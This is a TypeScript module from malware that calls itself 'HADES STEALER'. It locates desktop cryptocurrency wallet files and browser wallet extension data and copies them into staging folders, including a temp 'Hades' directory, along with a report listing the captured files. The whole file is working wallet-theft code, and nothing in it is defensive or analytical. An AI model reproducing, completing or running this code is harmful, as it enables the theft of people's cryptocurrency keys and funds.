import { promises as fs } from "fs";
import path from "path";
import os from "os";
import { desktopWalletPaths, WALLET_PATHS } from "../config/constants";

export async function extractDesktopWallets(outputDir: string) {
    const extractedWallets = [] as any[];
    const walletLogDir = path.join(outputDir, "All", "Wallet");
    let reportContent = "--- HADES STEALER: DESKTOP WALLET REPORT ---\n\n";

    try {
        await fs.mkdir(walletLogDir, { recursive: true });
    } catch (e) { }

    for (const [walletName, walletPath] of Object.entries(desktopWalletPaths)) {
        try {
            const stat = await fs.stat(walletPath as string).catch(() => null);
            if (!stat) continue;

            const destinationFolder = path.join(walletLogDir, walletName);
            await fs.mkdir(destinationFolder, { recursive: true });

            reportContent += `[+] WALLET: ${walletName}\n`;
            reportContent += `Source Path: ${walletPath}\n`;
            reportContent += `Files Copied:\n`;

            if (stat.isDirectory()) {
                const files = await getAllFilesWallet(walletPath as string, null, [], 0, 2);

                for (const f of files.slice(0, 50)) {
                    try {
                        const fStat = await fs.stat(f);
                        const relPath = path.relative(walletPath as string, f);
                        const targetPath = path.join(destinationFolder, relPath);

                        await fs.mkdir(path.dirname(targetPath), { recursive: true });
                        await fs.copyFile(f, targetPath);

                        reportContent += `  - ${relPath} (${(fStat.size / 1024).toFixed(2)} KB)\n`;
                    } catch (e) { continue; }
                }
            } else {
                const targetFile = path.join(destinationFolder, path.basename(walletPath as string));
                await fs.copyFile(walletPath as string, targetFile);
                reportContent += `  - ${path.basename(walletPath as string)} (${(stat.size / 1024).toFixed(2)} KB) [Single File]\n`;
            }

            reportContent += `\n----------------------------------------------------\n\n`;
        } catch (error) {
            reportContent += `[!] Error extracting ${walletName}: ${error}\n\n`;
        }
    }

    const reportFilePath = path.join(walletLogDir, 'Wallets.txt');
    await fs.writeFile(reportFilePath, reportContent, 'utf8');

    return extractedWallets;
}

async function getAllFilesWallet(dir: string, targetFileName: string | null = null, fileList: Array<any> = [], depth = 0, maxDepth = 3) {
    if (depth > maxDepth) return fileList;

    try {
        const files = await fs.readdir(dir);

        for (const file of files) {
            if (['node_modules', '.git', 'cache', 'Cache'].includes(file)) continue;

            const filePath = path.join(dir, file);
            try {
                const stat = await fs.stat(filePath);
                if (stat.isDirectory()) {
                    await getAllFilesWallet(filePath, targetFileName, fileList, depth + 1, maxDepth);
                } else {
                    if (!targetFileName || file.toLowerCase() === targetFileName.toLowerCase()) {
                        fileList.push(filePath);
                    }
                }
            } catch (error) { }
        }
    } catch (error) { }

    return fileList;
}


export async function copyBrowserWallets(browserName: string, profilePath: string, browserNameRaw: string) {
    const baseTempDir = path.join(os.tmpdir(), "Hades", "All", browserNameRaw, "wallets");
    const foundWallets: string[] = [];

    for (const wallet of WALLET_PATHS) {
        const extensionPath = path.join(profilePath, 'Local Extension Settings', wallet.id);

        try {
            const stat = await fs.stat(extensionPath).catch(() => null);
            if (!stat) continue;

            const destinationDir = path.join(baseTempDir, wallet.name);
            await fs.mkdir(destinationDir, { recursive: true });

            if (stat.isDirectory()) {
                await copyFolderRecursive(extensionPath, destinationDir);
            } else {
                await fs.copyFile(extensionPath, path.join(destinationDir, path.basename(extensionPath)));
            }

            foundWallets.push(wallet.name);
        } catch (error: any) { }
    }
    return foundWallets;
}

async function copyFolderRecursive(source: string, target: string) {
    const files = await fs.readdir(source);
    for (const file of files) {
        const curSource = path.join(source, file);
        const curTarget = path.join(target, file);
        const stat = await fs.stat(curSource);

        if (stat.isDirectory()) {
            await fs.mkdir(curTarget, { recursive: true });
            await copyFolderRecursive(curSource, curTarget);
        } else {
            await fs.copyFile(curSource, curTarget);
        }
    }
}